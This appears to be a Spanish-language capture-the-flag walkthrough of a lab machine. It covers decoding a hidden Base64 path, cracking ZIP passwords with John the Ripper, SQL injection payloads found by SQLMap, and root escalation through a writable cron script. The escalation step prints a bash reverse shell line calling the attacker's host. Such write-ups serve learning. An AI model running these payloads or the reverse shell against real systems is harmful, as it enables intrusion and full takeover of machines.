En /staging/file.txt encontramos una cadena larga que parece un hash o un relleno intencional.

Es una advertencia narrativa: el reto exige pensar más allá de lo obvio.

Durante la enumeración web se descubrió un archivo interesante en la ruta http://192.168.1.8/staging/zone1/zone2/dummy.txt. Al abrirlo, el contenido estaba lleno de texto de relleno (Lorem ipsum), pero entre las líneas se ocultaba una cadena alfanumérica sospechosa: L2R1YXJ0ZS1zYW5jaGV6

Usamos CyberChef para aplicar la operación From Base64 sobre el string L2R1YXJ0ZS1zYW5jaGV6. Con las opciones de modo estricto y limpieza de caracteres activadas, el resultado revela la ruta /duarte-sanchez.

en /duarte-sanchez/ se localizó un archivo comprimido llamado absurd_message_3.zip.

Se utiliza zip2john absurd3.zip > hash.txt para extraer el hash del archivo ZIP protegido. Esto genera un archivo hash.txt con el hash compatible para John the Ripper. Luego se ejecuta john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt para realizar un ataque de diccionario usando el wordlist rockyou.txt. El resultado muestra que la contraseña del archivo es freedom.

Se ejecuta unzip absurd_message_3.zip para extraer el contenido del archivo ZIP. El sistema solicita la contraseña, previamente identificada como freedom. Al ingresarla correctamente, se extrae el archivo absurd3.txt.

Se ejecuta cat absurd3.txt para visualizar el contenido del archivo previamente descomprimido. El mensaje dentro del archivo indica una ruta específica: /trinitarios/logs.

dentro del directorio /trinitarios/logs encontramos un zip llamado mella_key.zip

Se ejecuta john --wordlist=/home/user/darkhaze/rockyou.txt hashMella.txt para realizar un ataque de diccionario sobre el hash extraído del archivo mella_key.zip. El resultado muestra que la contraseña encontrada es libertad.

🔧 SQLMap

El escaneo identifica múltiples vectores de inyección: - Boolean-based blind: Payload exitoso: username=TEST' AND 9806=9806 AND '9806'='9806 ... - Error-based (MySQL >= 5.0): Payload: username=TEST' AND (SELECT 7702 FROM(SELECT COUNT(*),CONCAT(...) Ambos vectores confirman que el parámetro username es vulnerable a inyección SQL, y que el backend responde de forma predecible a manipulaciones en la cláusula WHERE

El siguiente comando lanza una inyección SQL automatizada sobre el endpoint vulnerable, utilizando el método POST y solicitando la enumeración de bases de datos (--dbs). El escaneo confirma que el backend utiliza MySQL 8.0.22, corriendo sobre Linux Ubuntu 20.10 con Apache 2.4.41 y PHP 7.4.3. 🚀 Escalada de privilegios

Dentro del directorio /home/duarte/backup, se encuentra el archivo script.sh con permisos de ejecución (-rwxr-xr-x) y propiedad del usuario duarte. El contenido del script es: #!/bin/bash echo "root whispers: hello!"

Este script, aunque simple, representa una vía de interacción entre el usuario duarte y el contexto de privilegios elevados. Al inspeccionar el archivo /etc/crontab, se observa que se ha añadido una nueva línea:

* * * * * root /home/duarte/backup/script.sh

Esto configura una tarea cron que ejecuta el script cada minuto como el usuario root.

El archivo script.sh, ubicado en /home/duarte/backup, es modificado para incluir una reverse shell: #!/bin/bash /bin/bash -i >& /dev/tcp/192.168.1.10/4444 0>&1

Se accede al directorio /root, donde esta la ultima flag y terminamos exitosamente la maquina.
